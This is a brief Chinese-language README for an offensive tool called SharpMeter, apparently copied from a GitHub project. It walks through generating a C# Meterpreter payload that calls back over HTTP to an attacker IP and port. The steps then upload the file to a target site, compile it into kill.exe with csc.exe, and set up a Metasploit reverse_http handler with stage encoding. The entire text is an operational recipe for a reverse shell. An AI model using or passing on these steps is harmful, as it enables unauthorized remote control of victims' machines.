# SharpMeter
原地址：https://github.com/vvalien/SharpMeter


#用法:

1. 生成一个.cs文件：

	+msf接收IP：192.168.18.129

	+msf接收PORT: 61051

	+用http传输

例如:

python SharpMeter.py 192.168.18.129 61051 kill.cs http

2. 上传到目标网站

编译成exe

E:\>C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:"kill.exe" /platform:

#MSF上监听：
use exploit/multi/handler

set payload windows/meterpreter/reverse_http

set LHOST 0.0.0.0

set LPORT 61051

set ExitOnSession false

set EnableStageEncoding true

set EnableUnicodeEncoding true

exploit -j



